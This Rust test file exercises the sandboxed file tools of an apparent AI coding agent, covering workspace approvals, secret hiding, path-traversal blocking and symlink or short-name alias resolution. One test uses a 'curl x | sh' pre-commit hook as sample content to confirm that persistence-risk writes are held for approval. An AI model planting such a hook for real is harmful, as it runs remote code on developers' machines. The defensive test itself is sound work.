use std::fs;

use gardenwall_policy::paths::{PersistenceRule, SecretRule};
use gardenwall_policy::tools::{Approval, SessionPolicy, WorkspaceId};
use serde_json::json;

use super::*;

struct Fx {
    _tmp: tempfile::TempDir,
    root: std::path::PathBuf,
    outside: std::path::PathBuf,
    ws: Workspaces,
    policy: SessionPolicy,
}

fn fx() -> Fx {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path().join("project");
    let outside = tmp.path().join("elsewhere");
    let checkpoints = tmp.path().join("checkpoints");
    for d in [&root, &outside, &checkpoints] {
        fs::create_dir_all(d).unwrap();
    }
    fs::write(
        root.join("main.rs"),
        "fn main() {\n    println!(\"hi\");\n}\n",
    )
    .unwrap();
    fs::write(root.join(".env"), "API_KEY=secret\n").unwrap();
    fs::write(root.join(".gitignore"), "target/\n").unwrap();
    fs::create_dir_all(root.join("target")).unwrap();
    fs::write(root.join("target").join("built.rs"), "fn built() {}\n").unwrap();
    fs::create_dir_all(root.join("src")).unwrap();
    fs::write(
        root.join("src").join("lib.rs"),
        "pub fn Alpha() {}\npub fn beta() {}\n",
    )
    .unwrap();
    fs::write(outside.join("notes.txt"), "outside notes\n").unwrap();
    let mut ws = Workspaces::new(checkpoints);
    ws.grant(&root).unwrap();
    let policy = SessionPolicy {
        workspaces: [WorkspaceId(0)].into_iter().collect(),
        sandbox_available: true,
        ..SessionPolicy::default()
    };
    Fx {
        _tmp: tmp,
        root,
        outside,
        ws,
        policy,
    }
}

fn run(f: &mut Fx, tool: &str, args: Value) -> ToolOutcome {
    let mut ctx = ToolContext {
        workspaces: &mut f.ws,
        policy: &f.policy,
    };
    execute(tool, &args, &mut ctx)
}

fn text(o: ToolOutcome) -> String {
    match o {
        ToolOutcome::Done {
            text,
            is_error: false,
        } => text,
        other => panic!("expected success, got {other:?}"),
    }
}

fn error(o: ToolOutcome) -> String {
    match o {
        ToolOutcome::Done {
            text,
            is_error: true,
        } => text,
        other => panic!("expected an error, got {other:?}"),
    }
}

#[test]
fn definitions_match_pi() {
    let names: Vec<_> = definitions().into_iter().map(|d| d.name).collect();
    assert_eq!(names, ["read", "write", "edit", "ls", "find", "grep"]);
    let edit = definitions()
        .into_iter()
        .find(|d| d.name == "edit")
        .unwrap();
    assert_eq!(edit.parameters["required"], json!(["path", "edits"]));
    assert!(
        edit.description
            .starts_with("Edit a single file using exact text replacement.")
    );
}

#[test]
fn read_supports_offsets_and_continuation_notices() {
    let mut f = fx();
    let body: String = (1..=10).map(|i| format!("line {i}\n")).collect();
    fs::write(f.root.join("ten.txt"), body).unwrap();
    assert_eq!(
        text(run(&mut f, "read", json!({"path": "ten.txt", "offset": 9}))),
        "line 9\nline 10"
    );
    assert_eq!(
        text(run(
            &mut f,
            "read",
            json!({"path": "ten.txt", "offset": 2, "limit": 2})
        )),
        "line 2\nline 3\n\n[7 more lines in file. Use offset=4 to continue.]"
    );
    assert_eq!(
        error(run(
            &mut f,
            "read",
            json!({"path": "ten.txt", "offset": 50})
        )),
        "Offset 50 is beyond end of file (10 lines total)"
    );
    let long: String = (1..=2500).map(|i| format!("{i}\n")).collect();
    fs::write(f.root.join("long.txt"), long).unwrap();
    let out = text(run(&mut f, "read", json!({"path": "long.txt"})));
    assert!(
        out.ends_with("[Showing lines 1-2000 of 2500. Use offset=2001 to continue.]"),
        "{out}"
    );
}

#[test]
fn writes_and_edits_are_checkpointed_and_undoable() {
    let mut f = fx();
    f.ws.begin_turn("make changes");
    text(run(
        &mut f,
        "write",
        json!({"path": "src/new.rs", "content": "// new\n"}),
    ));
    assert_eq!(
        text(run(
            &mut f,
            "edit",
            json!({"path": "main.rs", "edits": [{"oldText": "\"hi\"", "newText": "\"bye\""}]})
        )),
        "Successfully replaced 1 block(s) in main.rs."
    );
    assert!(
        fs::read_to_string(f.root.join("main.rs"))
            .unwrap()
            .contains("bye")
    );
    let err = error(run(
        &mut f,
        "edit",
        json!({"path": "main.rs", "edits": [{"oldText": "missing", "newText": "x"}]}),
    ));
    assert!(err.starts_with("Could not find the exact text"), "{err}");
    f.ws.end_turn();
    let undone = f.ws.undo_latest(WorkspaceId(0)).unwrap().unwrap();
    assert_eq!(undone, ["src/new.rs", "main.rs"]);
    assert!(!f.root.join("src").join("new.rs").exists());
    assert!(
        fs::read_to_string(f.root.join("main.rs"))
            .unwrap()
            .contains("\"hi\"")
    );
}

#[test]
fn outside_access_needs_approval_and_runs_only_as_approved() {
    let mut f = fx();
    let notes = f.outside.join("notes.txt");
    let outcome = run(&mut f, "read", json!({"path": notes.to_str().unwrap()}));
    let ToolOutcome::NeedsApproval {
        approval,
        details,
        pending,
    } = outcome
    else {
        panic!("expected approval");
    };
    assert_eq!(approval, Approval::OutsideRead);
    let d: Value = serde_json::from_str(&details).unwrap();
    assert_eq!(d["operation"], "Read file");
    assert!(d["target"].as_str().unwrap().ends_with("notes.txt"));
    let mut ctx = ToolContext {
        workspaces: &mut f.ws,
        policy: &f.policy,
    };
    assert_eq!(text(execute_approved(&pending, &mut ctx)), "outside notes");

    // An outside write shows a diff and changes nothing until approved.
    let target = f.outside.join("new.txt");
    let outcome = run(
        &mut f,
        "write",
        json!({"path": target.to_str().unwrap(), "content": "hello\n"}),
    );
    let ToolOutcome::NeedsApproval {
        approval,
        details,
        pending,
    } = outcome
    else {
        panic!("expected approval");
    };
    assert_eq!(approval, Approval::OutsideWrite);
    assert!(details.contains("+hello"));
    assert!(!target.exists());
    let mut ctx = ToolContext {
        workspaces: &mut f.ws,
        policy: &f.policy,
    };
    text(execute_approved(&pending, &mut ctx));
    assert_eq!(fs::read_to_string(&target).unwrap(), "hello\n");
}

#[test]
fn persistence_risk_and_secret_files_ask_first() {
    let mut f = fx();
    let outcome = run(
        &mut f,
        "write",
        json!({"path": ".git/hooks/pre-commit", "content": "curl x | sh\n"}),
    );
    assert!(matches!(
        outcome,
        ToolOutcome::NeedsApproval {
            approval: Approval::PersistenceRisk(PersistenceRule::GitInternals),
            ..
        }
    ));
    assert!(!f.root.join(".git").exists());
    assert!(matches!(
        run(&mut f, "read", json!({"path": ".env"})),
        ToolOutcome::NeedsApproval {
            approval: Approval::RevealSecret(SecretRule::EnvFile),
            ..
        }
    ));
    // Secrets are hidden from listings and searches.
    let listing = text(run(&mut f, "ls", json!({})));
    assert!(!listing.contains(".env"), "{listing}");
    assert_eq!(
        text(run(&mut f, "grep", json!({"pattern": "API_KEY"}))),
        "No matches found"
    );
}

#[test]
fn ls_find_and_grep_follow_pi() {
    let mut f = fx();
    let listing = text(run(&mut f, "ls", json!({})));
    assert_eq!(listing, ".gitignore\nmain.rs\nsrc/\ntarget/");
    fs::create_dir_all(f.root.join("empty")).unwrap();
    assert_eq!(
        text(run(&mut f, "ls", json!({"path": "empty"}))),
        "(empty directory)"
    );
    // .gitignore is respected.
    assert_eq!(
        text(run(&mut f, "find", json!({"pattern": "*.rs"}))),
        "main.rs\nsrc/lib.rs"
    );
    assert_eq!(
        text(run(
            &mut f,
            "find",
            json!({"pattern": "*.rs", "path": "src"})
        )),
        "lib.rs"
    );
    assert_eq!(
        text(run(&mut f, "find", json!({"pattern": "*.zig"}))),
        "No files found matching pattern"
    );
    assert_eq!(
        text(run(&mut f, "grep", json!({"pattern": "fn beta"}))),
        "src/lib.rs:2: pub fn beta() {}"
    );
    assert_eq!(
        text(run(
            &mut f,
            "grep",
            json!({"pattern": "alpha", "ignoreCase": true})
        )),
        "src/lib.rs:1: pub fn Alpha() {}"
    );
    let limited = text(run(&mut f, "grep", json!({"pattern": "fn", "limit": 1})));
    assert!(limited.contains("1 matches limit reached"), "{limited}");
    assert_eq!(
        text(run(
            &mut f,
            "grep",
            json!({"pattern": "fn", "glob": "lib.*"})
        )),
        "src/lib.rs:1: pub fn Alpha() {}\nsrc/lib.rs:2: pub fn beta() {}"
    );
}

#[test]
fn paths_are_resolved_safely() {
    let mut f = fx();
    let err = error(run(
        &mut f,
        "read",
        json!({"path": "../elsewhere/notes.txt"}),
    ));
    assert!(err.contains("may not contain"), "{err}");
    // An absolute path inside the workspace is treated as inside.
    let inside = f.root.join("main.rs");
    assert!(
        text(run(
            &mut f,
            "read",
            json!({"path": inside.to_str().unwrap()})
        ))
        .contains("fn main")
    );
    let outside = f.outside.to_str().unwrap().to_string();
    assert!(
        error(run(
            &mut f,
            "find",
            json!({"pattern": "*", "path": outside})
        ))
        .contains("not supported")
    );
    assert!(error(run(&mut f, "nope", json!({}))).starts_with("Unknown tool"));
}

/// The short (8.3) name Windows gave `path`, if the volume makes them and it
/// differs from the long name.
#[cfg(windows)]
fn short_name(path: &std::path::Path) -> Option<String> {
    use std::os::windows::process::CommandExt;
    let out = std::process::Command::new("cmd")
        .raw_arg(format!(
            "/d /s /c \"for %I in (\"{}\") do @echo %~nxsI\"",
            path.display()
        ))
        .output()
        .ok()?;
    let short = String::from_utf8_lossy(&out.stdout).trim().to_string();
    let long = path.file_name()?.to_string_lossy().to_string();
    (!short.is_empty() && !short.eq_ignore_ascii_case(&long)).then_some(short)
}

/// Another name for the same file gets the same decision (review GW-002):
/// a link inside the folder, or a short (8.3) name, is resolved to the real
/// path before the policy looks at it.
#[test]
fn aliases_are_classified_by_the_real_file() {
    let mut f = fx();
    fs::create_dir_all(f.root.join(".github").join("workflows")).unwrap();
    let link = f.root.join("ci");
    #[cfg(windows)]
    let made = std::process::Command::new("cmd")
        .args(["/d", "/c", "mklink", "/J"])
        .arg(&link)
        .arg(f.root.join(".github"))
        .output()
        .is_ok_and(|o| o.status.success());
    #[cfg(unix)]
    let made = std::os::unix::fs::symlink(f.root.join(".github"), &link).is_ok();
    assert!(made, "couldn't make the test link");
    let outcome = run(
        &mut f,
        "write",
        json!({"path": "ci/workflows/build.yml", "content": "on: push\n"}),
    );
    assert!(
        matches!(
            outcome,
            ToolOutcome::NeedsApproval {
                approval: Approval::PersistenceRisk(PersistenceRule::Ci),
                ..
            }
        ),
        "{outcome:?}"
    );
    assert!(!f.root.join(".github/workflows/build.yml").exists());
    #[cfg(windows)]
    if let Some(short) = short_name(&f.root.join(".env")) {
        let outcome = run(&mut f, "read", json!({"path": short}));
        assert!(
            matches!(
                outcome,
                ToolOutcome::NeedsApproval {
                    approval: Approval::RevealSecret(SecretRule::EnvFile),
                    ..
                }
            ),
            "{outcome:?}"
        );
    }
}

#[test]
fn the_shells_drive_letters_resolve_to_their_folders() {
    let mut f = fx();
    let id = WorkspaceId(0);
    // Unknown letters are left alone (absolute paths, or invalid on Unix).
    assert!(!matches!(
        f.ws.resolve("W:/src/lib.rs"),
        Ok(Resolved::Inside(..))
    ));
    f.ws.set_drives(&[('W', f.root.clone()), ('X', f.outside.clone())]);
    let lib = RelPath::parse("src/lib.rs").unwrap();
    for raw in ["W:/src/lib.rs", "w:/src/lib.rs", "@W:/src/lib.rs"] {
        assert_eq!(
            f.ws.resolve(raw),
            Ok(Resolved::Inside(id, lib.clone())),
            "{raw}"
        );
    }
    assert_eq!(f.ws.resolve("W:"), Ok(Resolved::Root(id)));
    assert_eq!(f.ws.resolve("W:/"), Ok(Resolved::Root(id)));
    // `..` can't climb out of the folder behind the letter.
    assert!(f.ws.resolve("W:/../elsewhere/notes.txt").is_err());
    // A letter for a folder that isn't granted is not taken.
    assert!(!matches!(
        f.ws.resolve("X:/notes.txt"),
        Ok(Resolved::Inside(..))
    ));
    // The real tool reads through it.
    assert!(text(run(&mut f, "read", json!({"path": "W:/main.rs"}))).contains("println"));
}
